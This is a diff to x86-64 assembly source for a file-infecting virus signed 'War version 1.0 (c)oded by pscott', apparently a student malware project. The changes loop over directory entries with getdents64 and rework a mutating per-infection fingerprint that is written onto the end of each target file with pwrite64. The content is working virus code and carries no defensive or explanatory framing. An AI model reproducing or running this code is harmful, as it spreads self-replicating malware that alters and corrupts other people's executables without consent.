@@ -26,23 +26,21 @@ _start:
   cmp rax, 0
   jl cleanup
 
+  mov [r15 + DOT_FD], rax ; store FD for later use
+
   ; --- GetDents64
-  mov rdi, rax ; move fd into rdi
-  lea rsi, [r15 + DIRENT] ; dirent will be in r15 + 400
+  loop_getdents:
+  mov rdi, [r15 + DOT_FD] ; load fd
+  lea rsi, [r15 + DIRENT] ; dirent will be in r15 + DIRENT
   mov rdx, DIRENT_SIZE ; 1024, size of a dirent
   mov rax, SYS_GETDENTS64 ; 
   syscall
 
-  mov qword [r15 + DIR_SIZE], rax ; store directory size
-
-  ; --- Close fd
-  ; rdi already contains fd
-  mov rax, SYS_CLOSE
-  syscall
+  mov [r15 + DIR_SIZE], rax ; store directory size
 
   ; Check if directory size is < 0
   cmp qword [r15 + DIR_SIZE], 0
-  jl cleanup
+  jle close_dot
 
   xor rcx, rcx ; set rcx to 0
 
@@ -258,13 +256,118 @@ _start:
       add rsi, r12 ; adjust pointer
 
 
-      mov eax, [rsi] ; load fingerprint
-      mov ebx, [r15 + FINGERPRINT_ADD] ; load how much we should increment
-      ; need to create function to properly increment
-      inc ebx ; increment SCOTT remove
-      mov [r15 + FINGERPRINT_ADD], ebx ; store it back
-      add eax, ebx ; add it to eax
-      mov [r15 + FINGERPRINT], eax ; store fingerprint
+      mov eax, [r15 + FINGERPRINT_ADD] ; load how much we should increment
+      inc eax
+      mov [r15 + FINGERPRINT_ADD], eax ; store it back
+      mov rax, [rsi] ; load fingerprint
+      .add: ; 
+        xor dl, dl
+        sub al, 0x30
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 1
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 2
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 3
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 4
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 5
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 6
+        add dl, al
+
+        shr rax, 8
+        sub al, 0x30
+        shl al, 7
+        add dl, al
+
+        xor rax, rax
+        mov eax, [r15 + FINGERPRINT_ADD]
+        add rdx, rax
+        xor rax, rax ; number is in rdx
+
+        xor r8, r8
+        mov r8, rdx ; 1
+        shr r8, 7 ; 1 0 0 0 0 0 0
+        and dl, 127 ; 0 1 1 1 1 1 1
+        add r8, 0x30 
+        shl r8, 56 ; 0x30 0 0 0 0 0 0 0
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 6
+        and dl, 63 ; 0 0 1 1 1 1 1 1
+        add r8, 0x30
+        shl r8, 48
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 5
+        and dl, 31 ; 0 0 1 1 1 1 1 1
+        add r8, 0x30
+        shl r8, 40
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 4
+        and dl, 15 ; 0 0 0 0 1 1 1 1
+        add r8, 0x30
+        shl r8, 32
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 3
+        and dl, 7 ; 0 0 0 0 0 1 1 1
+        add r8, 0x30
+        shl r8, 24
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 2
+        and dl, 3 ; 0 0 0 0 0 0 1 1
+        add r8, 0x30
+        shl r8, 16
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        shr r8, 1
+        and dl, 1 ; 0 0 0 0 0 0 0 1
+        add r8, 0x30
+        shl r8, 8
+        add rax, r8
+
+        xor r8, r8
+        mov r8, rdx
+        add r8, 0x30
+        add rax, r8
+
+      ; write fingerprint
+      mov [r15 + FINGERPRINT], rax ; store fingerprint
 
       ; -- Get to the end of the file
       mov rdi, r9 ; load fd
@@ -275,7 +378,7 @@ _start:
 
       lea rsi, [r15 + FINGERPRINT] ; load address
       mov r10, rax ; load EOF in rax
-      mov rdx, 4 ; want to write 4 bytes
+      mov rdx, fingerprint_len - 1 ; want to write 4 bytes
       mov rax, SYS_PWRITE64
       syscall
 
@@ -295,6 +398,12 @@ _start:
       add cx, word [rcx + r15 + DIRENT_D_RECLEN]
       cmp rcx, [r15 + DIR_SIZE]
       jl .loop_directory
+      jmp loop_getdents
+
+close_dot:
+  mov rdi, [r15 + DOT_FD]
+  mov rax, SYS_CLOSE
+  syscall
 
 call show_msg ; pushing db 'salut salut' on stack
 info_msg:
@@ -320,7 +429,7 @@ signature:
   db 0, 'War version 1.0 (c)oded by pscott - '
   signature_len equ $ - signature
 fingerprint:
-	db 0x42, 0x42, 0x42, 0x42, 0
+	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0
   fingerprint_len equ $ - fingerprint
 
 exit:
